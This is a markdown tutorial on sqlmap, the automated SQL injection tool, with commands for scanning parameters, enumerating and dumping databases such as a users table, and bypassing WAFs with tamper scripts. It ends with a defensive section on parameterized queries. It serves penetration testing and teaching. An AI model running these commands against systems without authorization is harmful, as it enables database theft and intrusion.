# SQLMap (Automated SQL Injection & Takeover) Complete Guide

`sqlmap` is an open-source penetration testing tool that automates the detection and exploitation of SQL injection vulnerabilities and the takeover of database servers. Equipped with a powerful detection engine, `sqlmap` supports full database fingerprinting, data fetching from database management systems (DBMS), accessing the underlying operating system, and executing commands via out-of-band connections.

---

## 📚 Table of Contents

1. [Overview & Supported DBMS Engines](#overview-supported-dbms-engines)
2. [Homebrew Installation & Verification](#homebrew-installation-verification)
3. [Basic Vulnerability Scanning (`-u`)](#basic-vulnerability-scanning--u)
4. [Testing POST Requests & Authenticated Sessions](#testing-post-requests-authenticated-sessions)
5. [Database Enumeration Workflow (`--dbs`, `--tables`, `--dump`)](#database-enumeration-workflow---dbs---tables---dump)
6. [SQL Injection Techniques Explained](#sql-injection-techniques-explained)
7. [Tuning Scan Thoroughness (`--level` and `--risk`)](#tuning-scan-thoroughness---level-and---risk)
8. [Bypassing WAFs & Filters with Tamper Scripts](#bypassing-wafs-filters-with-tamper-scripts)
9. [Automating Non-Interactive Runs (`--batch`)](#automating-non-interactive-runs---batch)
10. [Defensive Mitigation & Parameterized Queries](#defensive-mitigation-parameterized-queries)
11. [Everyday Cheat Sheet & Useful Aliases](#everyday-cheat-sheet-useful-aliases)
12. [Uninstallation](#uninstallation)

---

## 🔍 Overview & Supported DBMS Engines

`sqlmap` automates testing across virtually all relational and NoSQL databases:
- **Relational Databases**: MySQL, PostgreSQL, Oracle, Microsoft SQL Server, SQLite, MariaDB, IBM DB2, Sybase, Informix, Firebird, HSQLDB.
- **Injection Types**:
  - **B**: Boolean-based blind
  - **E**: Error-based
  - **U**: UNION query-based
  - **S**: Stacked queries
  - **T**: Time-based blind
  - **I**: Inline queries

---

## ⚙️ Homebrew Installation & Verification

### 1. Install via Homebrew

```bash
brew install sqlmap
```

### 2. Verify Installation

```bash
which sqlmap
sqlmap --version
```

Output:
```text
/opt/homebrew/bin/sqlmap
1.10.9#stable
```

---

## 🚀 Basic Vulnerability Scanning (`-u`)

Scan a target GET parameter:

```bash
sqlmap -u "https://testphp.vulnweb.com/artists.php?artist=1"
```

### How `sqlmap` Evaluates Targets
1. Tests for dynamic parameter behavior.
2. Identifies database technology and backend operating system.
3. Tests for injection payloads and confirms successful injection vectors.

---

## 🔐 Testing POST Requests & Authenticated Sessions

### 1. Scanning POST Requests (`--data`)

Submit HTTP POST payloads directly:

```bash
sqlmap -u "https://example.com/login.php" \
  --data="username=admin&password=test&submit=Login" \
  -p username
```
*(The `-p` flag instructs `sqlmap` to test only the `username` parameter).*

### 2. Scanning with Session Cookies (`--cookie`)

Test pages that require authentication:

```bash
sqlmap -u "https://example.com/profile.php?id=10" \
  --cookie="PHPSESSID=38b29f0c2a118d8; auth_token=xyz"
```

### 3. Scanning Raw Saved HTTP Requests (`-r`)

Save a full HTTP request from Burp Suite or browser DevTools into a file (`request.txt`) and pass it to `sqlmap`:

```bash
sqlmap -r request.txt -p id
```

---

## 📊 Database Enumeration Workflow (`--dbs`, `--tables`, `--dump`)

Once an injection vulnerability is confirmed, follow this progressive enumeration path:

### Step 1: Identify Database Names (`--dbs`)

```bash
sqlmap -u "https://example.com/item?id=1" --dbs
```

Output:
```text
available databases [3]:
[*] information_schema
[*] app_production
[*] test_db
```

### Step 2: List Tables in Target Database (`-D`, `--tables`)

```bash
sqlmap -u "https://example.com/item?id=1" -D app_production --tables
```

Output:
```text
Database: app_production
[4 tables]
+-----------------+
| users           |
| orders          |
| products        |
| system_logs     |
+-----------------+
```

### Step 3: Inspect Columns (`-T`, `--columns`)

```bash
sqlmap -u "https://example.com/item?id=1" -D app_production -T users --columns
```

### Step 4: Dump Table Data (`--dump`)

```bash
# Dump specific columns
sqlmap -u "https://example.com/item?id=1" -D app_production -T users -C email,username,role --dump
```

---

## 💉 SQL Injection Techniques Explained

`sqlmap` automatically identifies and leverages six distinct SQL injection techniques:

1. **Boolean-based blind (`--technique=B`)**: Injects SQL clauses that alter the HTTP response conditionally based on true/false database evaluations.
2. **Error-based (`--technique=E`)**: Forces the database to generate verbose error messages containing queried data.
3. **UNION query-based (`--technique=U`)**: Appends `UNION ALL SELECT` payloads to join query results directly into returned page content.
4. **Stacked queries (`--technique=S`)**: Injects semicolon-delimited subsequent SQL statements (e.g. `SELECT ...; DROP TABLE ...;`).
5. **Time-based blind (`--technique=T`)**: Injects time-delay sleep functions (e.g. `pg_sleep()`, `SLEEP()`) and infers data by measuring network response latencies.
6. **Inline queries (`--technique=I`)**: Embeds subqueries within existing SQL statements without breaking query structure.

---

## ⚙️ Tuning Scan Thoroughness (`--level` and `--risk`)

By default, `sqlmap` uses `--level 1` and `--risk 1`:

- **`--level` (1 to 5)**: Expands tests to include additional injection points.
  - Level 2: Adds HTTP `Cookie` header.
  - Level 3: Adds HTTP `User-Agent` and `Referer` headers.
  - Level 5: Thorough tests on all headers and parameters.
- **`--risk` (1 to 3)**:
  - Risk 1: Safe tests.
  - Risk 2: Adds heavy query tests.
  - Risk 3: Adds `OR`-based tests (may modify database rows if updates/deletes are tested).

```bash
# High-depth assessment
sqlmap -u "https://example.com/item?id=1" --level 3 --risk 2
```

---

## 🛡️ Bypassing WAFs & Filters with Tamper Scripts

Web Application Firewalls (WAFs) often block standard SQL keywords (`UNION`, `SELECT`). `sqlmap` provides dozens of built-in tamper scripts in Python to obfuscate payloads:

```bash
# List available tamper scripts
ls /opt/homebrew/share/sqlmap/tamper/

# Use URL encoding and space-to-comment tampering
sqlmap -u "https://example.com/item?id=1" \
  --tamper=space2comment,between,randomcase \
  --random-agent
```

---

## ⚡ Automating Non-Interactive Runs (`--batch`)

To run `sqlmap` inside automated CI/CD security pipelines without interactive terminal confirmation prompts:

```bash
sqlmap -u "https://example.com/item?id=1" --batch --dbs
```

`--batch` automatically selects default answers for all questions.

---

## 🛡️ Defensive Mitigation & Parameterized Queries

The definitive solution to SQL injection is **prepared statements (parameterized queries)** with Object-Relational Mappers (ORMs) or database drivers:

### Insecure:
```php
// Vulnerable string concatenation
$sql = "SELECT * FROM users WHERE id = " . $_GET['id'];
```

### Secure (PDO Prepared Statement):
```php
// Parameterized query: inputs are treated as literal data, not executable code
$stmt = $pdo->prepare('SELECT * FROM users WHERE id = :id');
$stmt->execute(['id' => $_GET['id']]);
$user = $stmt->fetch();
```

---

## 📋 Everyday Cheat Sheet & Useful Aliases

### Quick Commands

| Task | Command |
| :--- | :--- |
| **Basic Scan** | `sqlmap -u "https://target.com/page?id=1"` |
| **Scan POST Data** | `sqlmap -u "https://target.com/api" --data="id=1"` |
| **Scan From File** | `sqlmap -r request.txt` |
| **List Databases** | `sqlmap -u "https://target.com/page?id=1" --dbs` |
| **List Tables** | `sqlmap -u "https://target.com/page?id=1" -D app --tables` |
| **Dump Table** | `sqlmap -u "https://target.com/page?id=1" -D app -T users --dump` |
| **Non-Interactive** | `sqlmap -u "https://target.com/page?id=1" --batch` |
| **Use Tamper Script**| `sqlmap -u "https://target.com/page?id=1" --tamper=space2comment` |

---

## 🗑️ Uninstallation

```bash
brew uninstall sqlmap
```
